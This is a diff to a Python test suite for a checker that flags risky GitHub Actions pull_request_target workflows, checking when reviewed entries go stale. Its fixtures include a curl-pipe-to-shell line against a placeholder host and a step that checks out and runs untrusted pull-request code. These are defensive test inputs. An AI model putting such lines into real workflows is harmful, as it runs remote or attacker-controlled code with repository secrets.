@@ -35,9 +35,15 @@ def fail(label: str) -> None:
 
 
 def run_checker(workflows: dict[str, str], *arguments: str) -> tuple[int, str]:
-    with tempfile.TemporaryDirectory() as directory:
+    """Lay out a repository: bare names are workflows (or lists) in
+    .github/workflows; names with a slash are repository paths."""
+    with tempfile.TemporaryDirectory() as root:
+        directory = os.path.join(root, ".github", "workflows")
+        os.makedirs(directory)
         for name, body in workflows.items():
-            with open(os.path.join(directory, name), "w", encoding="utf-8") as handle:
+            target = os.path.join(root, name) if "/" in name else os.path.join(directory, name)
+            os.makedirs(os.path.dirname(target), exist_ok=True)
+            with open(target, "w", encoding="utf-8") as handle:
                 handle.write(textwrap.dedent(body))
         arguments = tuple(argument.replace("{dir}", directory) for argument in arguments)
         completed = subprocess.run(
@@ -970,6 +976,141 @@ expect(
     1,
     ("VIOLATION: other.yml [pull_request_target]: job 'app-key-policy'", REVIEW_REQUIRED),
     "an entry never covers identical content in another workflow",
+    *REVIEWED_ARGS,
+)
+
+
+# ---------------------------------------------------------------------------
+# Delta review of #1827 at 42508e98: an entry must go stale when code its job
+# runs changes outside the workflow file, and when the trigger block changes.
+# ---------------------------------------------------------------------------
+SCRIPT_JOB = {
+    "target.yml": f"""
+        on:
+          pull_request_target:
+            types: [closed]
+        jobs:
+          review:
+            runs-on: {TRUSTED_SELECTOR}
+            steps:
+              - uses: actions/checkout@v4
+                with:
+                  ref: ${{{{ github.event.pull_request.base.sha }}}}
+                  path: .source
+                  sparse-checkout: scripts/tool.sh
+              - working-directory: .source
+                run: bash scripts/tool.sh
+    """,
+    "scripts/tool.sh": "#!/usr/bin/env bash\ngh api repos/o/r\n",
+}
+SCRIPT_ROW = review_row(SCRIPT_JOB, "target.yml [pull_request_target]", "review")
+expect(
+    with_review(SCRIPT_JOB, SCRIPT_ROW),
+    0,
+    ("REVIEWED: target.yml [pull_request_target]: job 'review'",),
+    "a reviewed job that runs a repository script passes while the script is unchanged",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review({**SCRIPT_JOB, "scripts/tool.sh": SCRIPT_JOB["scripts/tool.sh"] + "curl -sSL https://example.test/x | sh\n"}, SCRIPT_ROW),
+    1,
+    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed",),
+    "(a) editing a script the reviewed job executes turns its entry stale",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(
+        {"target.yml": SCRIPT_JOB["target.yml"].replace("types: [closed]", "types: [closed, opened]"),
+         "scripts/tool.sh": SCRIPT_JOB["scripts/tool.sh"]},
+        SCRIPT_ROW,
+    ),
+    1,
+    ("STALE REVIEWED", "content changed"),
+    "editing the workflow trigger block turns the entry stale",
+    *REVIEWED_ARGS,
+)
+ACTION_JOB = {
+    "target.yml": f"""
+        on: pull_request_target
+        jobs:
+          review:
+            runs-on: {TRUSTED_SELECTOR}
+            steps:
+              - uses: actions/checkout@v4
+              - uses: ./.github/actions/x
+    """,
+    ".github/actions/x/action.yml": """
+        name: x
+        runs:
+          using: composite
+          steps:
+            - shell: bash
+              run: bash "${{ github.action_path }}/run.sh"
+    """,
+    ".github/actions/x/run.sh": "#!/usr/bin/env bash\necho lint\n",
+}
+ACTION_ROW = review_row(ACTION_JOB, "target.yml [pull_request_target]", "review")
+expect(
+    with_review(ACTION_JOB, ACTION_ROW),
+    0,
+    ("REVIEWED",),
+    "a reviewed job that uses an unchanged local composite action passes",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(
+        {**ACTION_JOB, ".github/actions/x/action.yml": ACTION_JOB[".github/actions/x/action.yml"] + """
+            - shell: bash
+              run: git fetch origin "refs/pull/${{ github.event.number }}/head" && git checkout FETCH_HEAD && npm test
+        """},
+        ACTION_ROW,
+    ),
+    1,
+    ("STALE REVIEWED", "content changed"),
+    "(b) editing a local composite action the reviewed job uses turns its entry stale",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review({**ACTION_JOB, ".github/actions/x/run.sh": "#!/usr/bin/env bash\nnpm test\n"}, ACTION_ROW),
+    1,
+    ("STALE REVIEWED", "content changed"),
+    "editing a script a local composite action runs turns the entry stale",
+    *REVIEWED_ARGS,
+)
+FLOATING = remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE.split("@")[0] + "@main")
+# The refusal carries no review digest to copy; any well-formed entry for the
+# same path and job stands in for "an entry exists".
+FLOATING_ROW = REMOTE_ROW
+expect(
+    with_review(FLOATING, FLOATING_ROW),
+    1,
+    ("VIOLATION: gate-rearm.yml [pull_request_target]: job 'app-key-policy'", "full 40-hex commit SHA"),
+    "(c) a remote callee pinned to a branch is refused even with an entry",
+    *REVIEWED_ARGS,
+)
+DYNAMIC_JOB = target_job("""
+    - run: bash "$TOOL_DIR/run.sh"
+""")
+DYNAMIC_ROW = review_row(DYNAMIC_JOB, "target.yml [pull_request_target]", "review")
+expect(
+    with_review(DYNAMIC_JOB, DYNAMIC_ROW),
+    1,
+    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "$TOOL_DIR/run.sh", "dynamic:"),
+    "a reviewed job executing a path the scanner cannot resolve fails without a dynamic: justification",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(DYNAMIC_JOB, DYNAMIC_ROW.rstrip("\n") + "\tdynamic: TOOL_DIR is set by the reviewed base workflow\n"),
+    0,
+    ("REVIEWED", "dynamic: TOOL_DIR is set by the reviewed base workflow"),
+    "a dynamic: justification classifies a statically unresolvable program",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(SCRIPT_JOB, SCRIPT_ROW.rstrip("\n") + "\tdynamic: not needed\n"),
+    1,
+    ("STALE REVIEWED", "dynamic: justification no longer applies"),
+    "a dynamic: justification on a fully resolvable job is stale",
     *REVIEWED_ARGS,
 )
 
